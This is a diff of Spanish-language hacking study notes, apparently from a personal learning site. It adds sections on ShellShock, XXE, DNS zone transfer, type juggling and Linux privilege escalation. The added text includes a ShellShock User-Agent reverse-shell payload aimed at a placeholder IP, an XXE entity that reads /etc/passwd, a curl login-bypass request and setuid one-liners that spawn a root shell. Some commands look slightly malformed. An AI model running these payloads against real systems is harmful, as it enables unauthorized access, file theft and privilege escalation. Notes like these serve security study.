@@ -22,6 +22,8 @@ tags:
   - Privilege Escalation
 ---
 
+![](/assets/images/certifados/Introduccion-al-hacking.jpeg)
+
 # Conceptos básicos
 ## Asignación e Interpretación de permisos
 
@@ -342,7 +344,6 @@ Entonces, hay una variedad de trucos diferentes para convertir su LFI en RCE, co
 ## Remote File Inclusion RFI
 
 Esta vulnerabilidad consiste en subir archivos a una página desde la de nuestro servidor compartido por el puerto 80.
-
 Abrimos nuestro servidor de la siguiente manera:
 
         sudo python3 -m http.server 80
@@ -374,7 +375,6 @@ No puede predecir el usuario que va a caer en la trampa.
 
 Pero si el código que insertamos no se queda almacenado en la web, sino que va embebido dentro de un enlace que se hace 
 llegar de algún modo a la víctima para que pinche en él, se dice que este tipo de ataque es reflejado. 
-
 Se llama así porque, si finalmente la víctima pincha en el enlace, el navegador le llevará a la página en cuestión, 
 que normalmente es un sitio legal donde el usuario tiene cuenta abierta, y a continuación ejecutará el código embebido, 
 el cual intentará robarle la «cookie» de la sesión, o los datos que introduzca en el formulario, o incluso podrá desencadenar 
@@ -399,8 +399,7 @@ no obstante, el origen de la URL se puede ocultar mediante ingeniería social y 
 
 ## Vulnerabilidad Server-Side Request Forgery (SSRF)
 
-Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridad 
-que van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
+Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridadque van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
 servidor web a realizar peticiones desde dentro del sistema hacia el exterior. Usando esas conexiones, los ataques de XSPA tratan 
 de conocer, en base a las respuestas obtenidas, la lista de puertos que se encuentran abiertos o por el contrario cerrados en el 
 servidor al que se fuerza la conexión.
@@ -473,6 +472,123 @@ Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera qu
  - Padding Oracle Attack - BurpSuite Bit Flipper Attack
 
 Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.
-
 Con esta función automatiza el ataque y te envía la cookie correcta que buscas.
 
+## Vulnerabilidad ShellShock
+
+Este tipo de ataque funciona cuando las cabeceras terminan en .cgi, .pl, .sh e incluso pueden ser otras extensiones, algunos vectores vulnerables son:
+
+ - Servidor Web CGI
+ - Servidor OpenSSH
+ - Clientes DHCP
+ - Servidor QMail
+ - Shell restringida IBM HMC
+
+Para poder hacer un ataque cambiamos el *User Agent* con BurpSuite y abrimos un puerto de escucha con nc, recargamos la página y se recarga la petición.
+
+```bash
+User-Agent: () { :; }; /bin/bash -i /dev/tcp/{IP}/443 
+```
+
+[ShellShock](https://blog.cloudflare.com/inside-shellshock/)
+
+## Vulnerabilidad XML External Entity Injection (XXE)
+
+XXE se refiere a un ataque de falsificación de solicitud de servidor (SSRF), mediante el cual un atacante es capaz de causar:
+
+ - Denegación de servicio (DDoS)
+ - Acceso a archivos y servicios locales o remotos
+
+Una vulnerabilidad de XXE consiste en una inyección que se aprovecha de la mala configuración del intérprete XML permitiendo incluir entidades externas, este ataque se realiza contra una aplicación que interpreta lenguaje XML en sus parámetros.
+Para identificar esta vulnerabilidad podemos interceptar la página con BurpSuite, si el Content Types es de tipo text/xml, application/xml estos son indicadores que nos permiten verificar, cómo los parámetros son enviados por el request a un intérprete de XML, adicionalmente también existe puede darse al parsear archivos como JSON a XML e inyectar el payload en el sitio web.
+Para ver si la web tiene este tipo de vulnerabilidad podemos intentar lo que se presenta en la siguiente página:
+
+[XXE](https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity)
+
+Inyectamos el código en la página, ya sea en el url o si es que se puede subiendo un archivo malicioso con el sgte código para listar usuarios
+
+```bash
+<!DOCTYPE foo  [<!ENTITY bar SYSTEM "file:///etc/passwd">]> <foo>&bar;</foo>
+```
+
+[Entendiendo y Explotando XXE](https://underc0de.org/foro/bugs-y-exploits/entendiendo-y-explotando-xxe-(external-xml-entities)/)
+
+## Vulnerabilidad Domain Zone Transfer
+
+Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS. La transferencia puede hacerse de dos formas: completa (AXFR) o incremental (IXFR)
+
+[Domain Zone Transfer](https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/)
+
+Tenemos diferentes programas para realizar el ataque, su sintaxis serían las siguientes:
+
+ - dnsenum
+
+```bash
+dnsenum --enum {IP}
+```
+
+ - dig
+ 
+```bash    
+dig @{IP} {URL} axfr     
+```
+
+## Vulnerabilidades de tipo Insecure Deserialization
+
+Para comprender qué es la deserialización insegura, primero debemos comprender qué son la serialización y la deserialización.
+
+ - La serialización se refiere a un proceso de conversión de un objeto a un formato que puede conservarse en el disco (por ejemplo,   guardarse en un archivo o almacén de datos), enviarse a través de secuencias (por ejemplo, stdout) o enviarse a través de una re   d. El formato en el que se serializa un objeto puede ser binario o texto estructurado (por ejemplo, XML, JSON YAML…). JSON y XML   son dos de los formatos de serialización más utilizados dentro de las aplicaciones web.
+
+ - La deserialización, por otro lado, es lo opuesto a la serialización, es decir, transformar datos serializados provenientes de un   archivo, flujo o conector de red en un objeto.
+
+[Más información](https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/)
+
+## Vulnerabilidad Type Juggling sobre panel Login
+
+Este tipo de vulnerabilidad se da en archivos .php que usan tablas comparativas para logearse, se pede romper con este comando:
+```bash
+curl -s -X POST --data "usuario=&password[]=" {IP/}
+```
+
+# Escala de privilegios
+
+## Abuso del Sudoers para escalar privilegios
+
+Para escalar privilegios debemos listar los permisos, investigando en [GTFobins](https://gtfobins.github.io/) encontramos la manera de acceder como root
+
+## Abuso de permisos SUID para escalar privilegios
+
+Listamos si tenemos privilegios SUID con el comando `find \perm -4000 2>/dev/null` y buscamos en la anterior página si hay una vulnerabilidad. 
+[SUID](https://www.luisguillen.com/posts/2017/12/como-funcionan-permisos-suid/)
+
+## Abuso de las Capabilities para escalar privilegios
+
+[Capabilities](https://www.incibe-cert.es/blog/linux-capabilities)
+
+En la anterior página tenemos información sobre la escala de privilegio a traves de las Capabilities, algunos comandos son:
+
+```bash
+getcap -r / 2>/dev/null #Reconocimiento de capas
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+php7.3 -r "posix_setuid(0); system('/bin/bash');"
+```
+## PATH Hijacking / Library Hijacking
+
+Para escalar privilegios debemos buscar algunas librerias de python que tienen esta vulnerabilidad, como se muestra en la siguiente página
+[Python Hijacking](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
+
+## Abuso del Kernel para escalar privilegios
+
+Para esta escala de privilegios debemos saber la version de kernel de la máquina y buscar una vulnerabilidad ya sea en searchexploit entre otros.
+
+```bash
+uname -a
+```
+
+# Reconocimiento del sistema
+
+Es recomendable hacer un reconocimiento de nuestro sistema, la siguiente herramienta nos ayuda a reconocer el sistema Linux, en cuanto a Windows tenemos winPEAS.
+
+[Windows](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+[Linux](https://github.com/diego-treitos/linux-smart-enumeration)
